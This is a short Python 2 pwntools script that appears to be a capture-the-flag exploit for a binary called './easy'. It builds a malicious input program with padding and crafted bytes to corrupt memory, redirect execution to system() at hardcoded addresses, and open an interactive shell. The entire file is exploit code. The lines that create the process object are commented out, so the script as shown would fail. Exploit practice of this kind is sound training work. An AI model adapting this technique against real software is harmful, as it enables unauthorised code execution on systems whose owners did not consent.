#!/usr/bin/env python2

from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

#p = process('./easy')
#p = gdb.debug('./easy')

puts_plt = 0x00400810
system = 0x400870

payload = ""

payload += "VALUE 1 65\n"

#payload += "VALUE 2 66\n"
pay = "VALUE 2 "
pay += str(system)
pay += '\n'
payload += pay

payload += "VALUE 3 67\n"
payload += "MOV 1 2\n"

pay = "// "
pay += "A" * (32 - len(pay) - 1)
pay += '\n'
payload += pay

pay = "// "
pay += "B" * (32 - len(pay))
pay += "\x07\x00"
pay += "B" * (0xFFFF - len(pay) - 1)
pay += '\n'
payload += pay

pay = "VALUE 4 29400045130965551"
pay += '\n'
payload += pay

payload += "PRINT 4\n"
payload += "END\n"

p.send(payload)

p.interactive()